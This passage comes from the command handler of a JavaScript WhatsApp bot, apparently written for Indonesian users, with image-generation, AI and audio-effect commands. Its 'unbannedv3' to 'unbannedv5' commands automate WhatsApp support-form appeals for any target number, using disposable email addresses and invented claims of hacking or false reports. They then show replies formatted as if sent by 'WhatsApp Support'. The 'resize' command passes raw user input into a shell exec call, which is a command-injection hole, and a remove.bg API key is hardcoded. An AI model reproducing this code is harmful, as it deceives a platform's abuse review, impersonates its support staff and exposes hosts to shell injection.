} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
//=================================================
case 'unbannedv3': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola WhatsApp
Actualmente, algunas personas tienen muchas formas efectivas de bloquear números de usuario e informarlos sin ningún motivo, de hecho, conozco bien los términos de servicio y los cumplí, pero algunos piratas informáticos me hicieron un informe falso y mi número fue bloqueado, desbloquee el número ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
//=================================================
case 'unbannedv4': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good day whatsApp team. My whatApp account has been burned permanently, please i plead with you unblock it, i cannot use another number again. I don’t know why it is burned but my friends re suggesting its because i use GB whatsApp, which i didn’t know it was wrong. My number is [ ${targetnya} ]. Please whatsApp team, help me unblock my account. please i cannot use a new number as my current number is connected to slot of important things like vacancies.
Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
//=================================================
case 'unbannedv5': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aloha WhatsApp, ua ʻaihue ʻia kaʻu helu e ka mea hacker, e ʻoluʻolu e wehe hou iā ia [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'HuBotZ': {
if (!isCreator&&!isPremium) return reply('Bugg Cuyy Awokwok😱')
HuBotZ.sendMessage(m.chat, {
    'text': 'Iya'
  }, {
    'quoted': HuBotZa
  })
  }
break
case 'intro':{
var intro =`0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄
│       *「 Kartu Intro 」*
│ *Nama     :* 
│ *Gender   :* 
│ *Umur      :* 
│ *Hobby    :* 
│ *Kelas      :* 
│ *Asal         :* 
│ *Agama    :* 
|  *Status     :* 
╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙
`
HuBotZ.sendMessage(m.chat, {text: intro }, {quoted: fkontak})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'tes': 
case 'test':
addCountCmd('#tes', m.sender, _cmd)
HuBotZ.sendMessage(m.chat, {text: `_*${global.botname} On Ngab*_\n_*Waktu Online*_ : ${runtime(process.uptime())}`}, {quoted: fkontak})
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'bot': case 'simi':
if (!q) reply('Iya Kak?')
let simi = await fetchJson(`https://api.zahwazein.xyz/entertainment/simisimi?text=${q}&apikey=${global.ZenzKey}`)
const simi2 = simi.result.message
HuBotZ.sendMessage(m.chat, {text: simi2}, {quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'bokep': {
if (!m.isGroup)return reply(mess.OnlyGrup)
if (!isCreator && !isPremium) return m.reply('Astaga, Tobat Bro Jangan Bokep Mulu:v')
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'listbahasa':
var clear = ["auto", "isSupported", "getCode"]
var teks = `List Bahasa Yang Tersedia\n\n`
for (let i in translate.languages) {
if (!clear.includes(i)) {
teks += `*${i}* untuk ${translate.languages[i]}\n`
}
}
replygcHuBotZ(teks)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'differentme': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
if (!quoted) return reply(`Mana Fotonya Tod?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply('Proses Ayangg')
try {
const media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
const img = await fetch (`https://skizo.tech/api/aimirror?&apikey=${global.XznKey}&url=${anu}&filter=${text}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
HuBotZ.sendMessage(m.chat, { image: { url: imgs }, caption: `*Done*\n*Fetching Time:* ${capt}`}, { quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
} catch (error) {
m.reply(`Masukkan Nama Filter Yang Valid!\nList Filter :\n- anime_2d\n- cartoon_3d\n- pretty_soldier\n- bizarre\n- romance_comic\n- maid_dressing\n- superhero_comic\n- watercolor\n- doodle\n- america_comic\n- starry_girl`)
}
}
break
case 'getmodeldiff':
case 'getmodeldiffuser': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && !isCreator) return reply(mess.OnlyPrem);
const { HuggingFaceBuffer } = require("./lib/huggingface");
    const input_data = [
        'Daniil-plotnikov/realism-diffusion',
        'aipicasso/manga-diffusion-poc',
        'Envvi/Inkpunk-Diffusion',
        'tensor-diffusion/AsianRealistic_SDLife_ChiasedammeV9.0',
        'hakurei/waifu-diffusion',
        'nitrosocke/mo-di-diffusion',
        'nitrosocke/Ghibli-Diffusion'
    ];
let data = input_data.map((item, index) => ({
title: (item.split('/')[1]).toUpperCase(),
id: item
}));
m.reply(`*Berikut Ini Seluruh Model Yang Ada Di HuggingFace*\n`+ data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'diffuser': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
const { HuggingFaceBuffer } = require('./lib/huggingface');
    const input_data = [
        'Daniil-plotnikov/realism-diffusion',
        'aipicasso/manga-diffusion-poc',
        'Envvi/Inkpunk-Diffusion',
        'tensor-diffusion/AsianRealistic_SDLife_ChiasedammeV9.0',
        'hakurei/waifu-diffusion',
        'nitrosocke/mo-di-diffusion',
        'nitrosocke/Ghibli-Diffusion'
    ];

    let [urutan, tema] = text.split("|")
    if (!tema) return m.reply(`Masukan Promtnya!\n*Contoh:*\n${prefix + command} [nomorModel]|[prompt]\n\n*Note :* Jika Ingin Melihat Seluruh Model Nya Ketik ${prefix}getmodeldiff`)

    try {
        let data = input_data.map((item, index) => ({
            title: (item.split('/')[1]).toUpperCase(),
            id: item
        }));
        if (!urutan) return m.reply("Input query!\n*Example:*\n.diffuser [nomorModel]|[prompt]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (isNaN(urutan)) return m.reply("Input query!\n*Example:*\n.diffuser [nomorModel]|[prompt]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (urutan > data.length) return m.reply("Input query!\n*Example:*\n.diffuser [nomorModel]|[prompt]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        let out = data[urutan - 1].id
        
            let { key } = await HuBotZ.sendMessage(m.chat, { text: "Silahkan ditunggu, jika bot tidak mengirimkan pesan silahkan diulang command tersebut" }, { quoted: m });
    await sleep(2000);
    const message = [
        "□□□□□□□□□□ 0%",
        "■■□□□□□□□□ 20%",
        "■■■■□□□□□□ 40%",
        "■■■■■■□□□□ 60%",
        "■■■■■■■■□□ 80%",
        "■■■■■■■■■■ Completed"
    ];

    for (let i = 0; i < message.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: message[i], edit: key });
    }
    await sleep(1000);
        const openAIResponse = await HuggingFaceBuffer(out, encodeURIComponent(tema));

        if (openAIResponse) {
            const tag = `@${m.sender.split('@')[0]}`;

            await HuBotZ.sendMessage(m.chat, {
      image: openAIResponse,
      caption: `*Status :* True\n*Model :* ${out}\n*Request by :* ${tag}`,
      mentions: [m.sender]
    }, {
      quoted: m
    });
addCountCmd(`#${command}`, m.sender, _cmd);
        } else {
            console.log("Tidak ada respons dari OpenAI atau terjadi kesalahan.");
        }
    } catch (e) {
        await m.reply(eror)
    }
}
break
case 'text2img':
case 'txt2img': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem);
if (!text) reply('Masukan Promptnya\nContoh:\n1girl, with glasses, in beach');
await replyLoad1();
const response = await fetch(`https://api.ibeng.tech/api/ai/text2img?text=${text}&apikey=${global.ibeng}`);
    const buffer = await response.buffer();
    await HuBotZ.sendMessage(m.chat, { image: buffer, caption: `*Prompt:* ${text}\n*Style:* Text2Image\n*RestApi:* api.ibeng.tech` }, { quoted: m });
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'txt2imgv2':
case 'text2imgv2': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && !isCreator) return reply(mess.OnlyPrem)
const allmodel = [
"absolutereality_V16.safetensors [37db0fc3]",
"absolutereality_v181.safetensors [3d9d4d2b]",
"analog-diffusion-1.0.ckpt [9ca13f02]",
"anythingv3_0-pruned.ckpt [2700c435]",
"anything-v4.5-pruned.ckpt [65745d25]",
"anythingV5_PrtRE.safetensors [893e49b9]",
"AOM3A3_orangemixs.safetensors [9600da17]",
"deliberate_v2.safetensors [10ec4b29]",
"dreamlike-diffusion-1.0.safetensors [5c9fd6e0]",
"dreamlike-photoreal-2.0.safetensors [fdcf65e7]",
"dreamshaper_6BakedVae.safetensors [114c8abb]",
"dreamshaper_7.safetensors [5cf5ae06]",
"dreamshaper_8.safetensors [9d40847d]",
"EimisAnimeDiffusion_V1.ckpt [4f828a15]",
"elldreths-vivid-mix.safetensors [342d9d26]",
"lyriel_v16.safetensors [68fceea2]",
"mechamix_v10.safetensors [ee685731]",
"meinamix_meinaV9.safetensors [2ec66ab0]",
"meinamix_meinaV11.safetensors [b56ce717]",
"openjourney_V4.ckpt [ca2f377f]",
"portraitplus_V1.0.safetensors [1400e684]",
"Realistic_Vision_V1.4-pruned-fp16.safetensors [8d21810b]",
"Realistic_Vision_V2.0.safetensors [79587710]",
"Realistic_Vision_V4.0.safetensors [29a7afaa]",
"Realistic_Vision_V5.0.safetensors [614d1063]",
"redshift_diffusion-V10.safetensors [1400e684]",
"revAnimated_v122.safetensors [3f4fefd9]",
"sdv1_4.ckpt [7460a6fa]",
"v1-5-pruned-emaonly.safetensors [d7049739]",
"shoninsBeautiful_v10.safetensors [25d8c546]",
"theallys-mix-ii-churned.safetensors [5d9225a4]",
"timeless-1.0.ckpt [7c4971d4]"
];

const allsampler = [
"Euler",
"Euler a",
"Heun",
"DPM++ 2M Karras",
"DPM++ SDE Karras",
"DDIM"
];
  m.reply(`Masukan Model yang ingin Anda gunakan!\n\n*AllModel:*\n${allmodel}`)
  const modelT2IMG = await getMessageBody();
  HuBotZ.sendMessage(m.chat, { text: `Sekarang masukkan *Sampler!*\n\n*AllSampler:* ${allsampler}`}, {quoted: m});
  const samplerT2IMG = await getMessageBody();
 HuBotZ.sendMessage(m.chat, { text: "Sekarang masukkan *Negative Prompt!*" }, {quoted: m});
  const negativeT2IMG = await getMessageBody();
 HuBotZ.sendMessage(m.chat, { text: "Sekarang masukkan *Prompt!*" }, {quoted: m});
  const promptT2IMG = await getMessageBody();
 HuBotZ.sendMessage(m.chat, { text: "Gambar Anda sedang diproses.." }, {quoted: m});
 try {
  const api2IMG = `https://api.miftahganzz.tech/api/ai/text2img?model=${modelT2IMG}&sampler=${samplerT2IMG}&steps=25&cfg_scale=7&negative_prompt=${negativeT2IMG}&prompt=${promptT2IMG}&apikey=${global.miftah}`;

  const res2IMG = await fetch(api2IMG);
  const data2IMG = await res2IMG.json();

  if (data2IMG.status === "success") {
    const img2IMG = data2IMG.result.img;
    return HuBotZ.sendMessage(m.chat, {
      image: {
        url: img2IMG
      },
      caption: `*prompt:* ${promptT2IMG}\n*model:* ${modelT2IMG}\n*sampler:* ${samplerT2IMG}\n*negative_prompt:* ${negativeT2IMG}\n*steps:* 25\n*cfg_scale:* 7`}, {quoted: m});
addCountCmd(`#${command}`, m.sender, _cmd);
  } else {
    return m.reply("Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.");
  }
  } catch (e) {
  console.log(e)
  }
  }
  break;
case 'getmodel':
case 'getmodelprodia': {
if (!isPremium && !isCreator) return reply(mess.OnlyPrem);
const { getModels } = require("./lib/Prodia");
const input_data = await getModels();
let data = Object.keys(input_data).map(title => ({
title,
id: input_data[title]
}));
m.reply(`*Berikut Ini Seluruh Model Yang Ada Di Prodia*\n`+ data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'txt2imgv3':
case 'text2imgv3': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && !isCreator) return reply(mess.OnlyPrem);
const {
    getModels,
    draw,
    req,
    imageReq,
    generate
} = require("./lib/Prodia");
    const input_data = await getModels();

    let [urutan, tema] = text.split("|")
    if (!tema) return m.reply(`Masukan Promtnya!\n*Contoh:*\n${prefix + command} [nomorModel]|[prompt]\n\n*Note :* Jika Ingin Melihat Seluruh Model Nya Ketik ${prefix}getmodel/${prefix}getmodelprodia`)

    try {
        let data = Object.keys(input_data).map(title => ({
            title,
            id: input_data[title]
        }));
        if (!urutan) return m.reply(`Masukan Promtnya!\n*Contoh:*\n${prefix + command} [nomorModel]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (isNaN(urutan)) return m.reply(`Masukan Promtnya!\n*Contoh:*\n${prefix + command} [nomorModel]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (urutan > data.length) return m.reply(`Masukan Promtnya!\n*Contoh:*\n${prefix + command} [nomorModel]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        let out = data[urutan - 1].id
    
    let { key } = await HuBotZ.sendMessage(m.chat, { text: "Silahkan ditunggu, jika bot tidak mengirimkan pesan silahkan diulang command tersebut" }, { quoted: m });
    await sleep(2000);
    const message = [
        "□□□□□□□□□□ 0%",
        "■■□□□□□□□□ 20%",
        "■■■■□□□□□□ 40%",
        "■■■■■■□□□□ 60%",
        "■■■■■■■■□□ 80%",
        "■■■■■■■■■■ Completed"
    ];

    for (let i = 0; i < message.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: message[i], edit: key });
    }
    await sleep(1000);
         let txt2imgnya = 
`        *Model :* ${out}
        *Steps :* 25
        *Cfg_Scale :* -1
        *Upscale :* true
        *Sampler :* DPM++ SDE Karras
        *Aspect_Ratio :* square`
    HuBotZ.sendMessage(m.chat, { text: `${txt2imgnya}`, edit: key });
    await sleep(3000);
            const params = {
            prompt: encodeURIComponent(tema),
            negative_prompt: '',
            model: out
        };
        const openAIResponse = await generate(params);

        if (openAIResponse) {
            const tag = `@${m.sender.split('@')[0]}`;
            await HuBotZ.sendMessage(m.chat, {
                image: openAIResponse[0].buffer,
                caption: `*Status :* true\n*Model :* ${out}\n*Request by :* ${tag}`,
                mentions: [m.sender]
            }, {
                quoted: m
            });
addCountCmd(`#${command}`, m.sender, _cmd);
        } else {
            console.log("Tidak ada respons dari OpenAI atau terjadi kesalahan.");
        }
    } catch (e) {
        console.log(e)
        reply('_Error Dikit Gak Ngaruh_')
    }
}
break
case 'aiscene': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await replyLoad1();
const media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
HuBotZ.sendMessage(m.chat, { image: { url: `https://xzn.wtf/api/aiscene?url=${anu}&apikey=${global.XznKey}` }, caption: 'Done Bruh Kalo Jelek Maapin Ya:<'}, { quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'toanime':
case 'jadianime': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
  if (!isPremium && !isCreator) return reply(mess.OnlyPrem)
  if (!isMedia) return reply(`Kirim/balas gambar dengan keterangan: ${prefix + command}`)
  if (!/image/.test(mime)) return reply(`Kirim/balas gambar dengan keterangan: *${prefix + command}*`);
  m.reply('_G E N E R A T I N G_')
  mee = await HuBotZ.downloadAndSaveMediaMessage(quoted)
  mem = await TelegraPh(mee);
    try {
        const response = await axios.get(`https://skizo.tech/api/toanime?url=${encodeURIComponent(mem)}&apikey=${global.XznKey}`, {
            responseType: 'arraybuffer',
        });
        const imageBuffer = Buffer.from(response.data, 'binary');       
        await HuBotZ.sendMessage(m.chat, { image: imageBuffer, caption: `*> Style:* Jadi Anime\n*> RestApi:* api.skizo.tech` }, { quoted: m });   
addCountCmd(`#${command}`, m.sender, _cmd);
    } catch (error) {
        console.error('Error:', error);
        reply('Terjadi kesalahan saat mengubah gambar menjadi versi anime.');
    }
}
break
case 'removebackground':
case 'removebg': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
  if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
  if (!isMedia) return reply(`Kirim/balas gambar dengan keterangan: *${prefix + command}*`);
  if (!/image/.test(mime)) return reply(`Kirim/balas gambar dengan keterangan: *${prefix + command}*`);
  reply('*Sabar...*');
  mee = await HuBotZ.downloadAndSaveMediaMessage(quoted);
  mem = await TelegraPh(mee); 
  try {
    const response = await axios({
      method: 'post',
      url: 'https://api.remove.bg/v1.0/removebg',
      headers: {
        'X-Api-Key': 'Di7ARuht24dt4uoYs436uHaa',
      },
      data: {
        image_url: mem,
      },
      responseType: 'arraybuffer',
    });
    if (response.status === 200 && response.data) {
      const tempFilePath = './tmp/temp_removebg.png';
      fs.writeFileSync(tempFilePath, Buffer.from(response.data, 'binary'));
      await HuBotZ.sendMessage(m.chat, { image: fs.readFileSync(tempFilePath), caption: `*> Style:* Remove Background\n*> RestApi:* www.remove.bg` }, { quoted: m });
      fs.unlinkSync(tempFilePath);
    } else {
      reply('Gagal menghapus latar belakang gambar.');
    }
  } catch (error) {
    console.error('Error removing background:', error);
    reply('Terjadi kesalahan saat menghapus latar belakang gambar.');
  }
addCountCmd(`#${command}`, m.sender, _cmd);
  }
  db.data.users[m.sender].limit -= 1
  break
case 'resize': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!q) return reply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
reply(mess.wait) 
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await HuBotZ.sendMessage(m.chat, {mimetype: 'image/jpeg', image: buffer453, caption: `Done Ayang>///<`}, { quoted: fkontak })
fs.unlinkSync(ran)
})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'remini': case 'hd': case 'hdr': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 3) return m.reply(`Limit Kamu Kurang Dari 3!!!\nDan Tidak Dapat Menggunakan Fitur Ini!`)
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let { key } = await HuBotZ.sendMessage(m.chat, { text: "Silahkan ditunggu, jika bot tidak mengirimkan foto silahkan diulang command tersebut" }, { quoted: m });
    await sleep(2000);
    const messages = [
        "*Limit Anda Berkurang 3*"
    ];     
    for (let i = 0; i < messages.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
        db.data.users[m.sender].limit -= 3;
        let limitPrib = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitPrib}`
HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
        if (i !== messages.length - 1) {
            await sleep(0);
        }
    }
    await sleep(0);
let media = await quoted.download()
let proses = await remini(media, "enhance");
HuBotZ.sendMessage(m.chat, { image: proses, caption: `*Remini Quality :* Random`}, { quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break

// Converter & Tools Menu
case 'ssweb': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!q) return reply(`Example ${prefix+command} link`)
let krt = await scp1.ssweb(q)
HuBotZ.sendMessage(m.chat,{image:krt.result,caption:mess.succes}, {quoted:m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'bass':
case 'blown':
case 'deep':
case 'earrape':
case 'fast':
case 'fat':
case 'nightcore':
case 'reverse':
case 'robot':
case 'slow':
case 'smooth':
case 'squirrel':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
  if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit);

  await HuBotZ.sendMessage(m.chat, {
    react: {
      text: '⌛',
      key: m.key,
    }
  });

  try {
    let set;
    if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
    if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
    if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
    if (/earrape/.test(command)) set = '-af volume=12';
    if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
    if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
    if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
    if (/reverse/.test(command)) set = '-filter_complex "areverse"';
    if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
    if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
    if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
    if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';

